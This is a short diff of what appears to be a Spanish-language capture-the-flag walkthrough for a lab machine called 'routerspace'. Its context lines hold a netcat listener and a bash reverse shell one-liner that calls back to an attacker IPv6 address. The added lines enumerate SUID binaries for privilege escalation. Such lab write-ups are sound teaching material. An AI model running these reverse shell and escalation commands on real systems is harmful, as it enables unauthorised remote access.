@@ -54,9 +54,10 @@ Para hacer que el anbox tenga conectividad hay que bajarse un [script](https://r
 └─$ sudo nc -6nlvp 443 
 bash -c 'bash -i >& /dev/tcp/dead:beef:2::100e/443 0>&1'
 ```
-
-- SUIDs -> /usr/bin/sudo 
-- Capabilities -> /usr/bin/node = cap_net_bind_service+ep
+```console
+paul@routerspace:/tmp$ find / -perm /4000 2>/dev/null
+```
+- SUIDs -> /usr/bin/sudo
 
 ```console
 paul@routerspace:/tmp$ sudo --version
